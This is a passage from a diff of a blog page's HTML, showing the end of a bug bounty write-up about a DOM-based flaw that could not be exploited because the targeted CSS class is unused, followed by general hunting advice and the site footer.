+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This should trigger the DOM change, right? Wrong! This did not trigger any changes whatsoever.</p>
+<p>I kept digging in the code more and more. Almost to the point where I decided to give up. Then, I thought to search in my Burp Suite history about this CSS class <code>.profile-img-placeholder</code>. I wanted to see where this class is used so I can better understand the issue.</p>
+<p>And as it turns out, there was no element that had this class. The only file where I found this CSS class to be refereced was this very script I was reading. No other references were found even after manually crawling the entire website.</p>
+<p>In the future, if the <code>.profile-img-placeholder</code> class is added, I&rsquo;ll be prepared to exploit this vulnerability.</p>
+<p>This is it. End of article. Apparantly, not all writeups end with a bounty.</p>
+<h3 id="conclusiontakeaways">Conclusion/Takeaways<a href="#conclusiontakeaways" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<ol>
+<li>Always check the scope you&rsquo;re hacking before and after submitting the report.</li>
+<li>Learn a programming language of your choice.</li>
+<li>Manually review the source code in order to identify any potential vulnerabilities. With frequent practise, vulnerable code sections are easier to identify revealing potential vulnerabilities.</li>
+</ol>
+<p>I work full time as a bug bounty hunter mostly hacking in Synack Red Team (SRT). If you&rsquo;re interested in becoming a part of the Synack Red Team, feel free to connect with me on Twitter, Instagram, or LinkedIn. I&rsquo;m always happy to offer guidance to fellow cybersecurity enthusiasts.</p>
+<p>Cheers! Adios!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="https://kuldeep.io/posts/holiday-hunting-with-aquatone/">
+                <span class="button__text">Holiday Hunting With Aquatone</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="kuldeepdotexe" data-description="Support me on Buy me a coffee!" data-message="Thank you for reading. If you liked this, you can support this by buying me a coffee." data-color="#FF5F5F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<script src="https://kuldeep.io/assets/main.js"></script>
+<script src="https://kuldeep.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
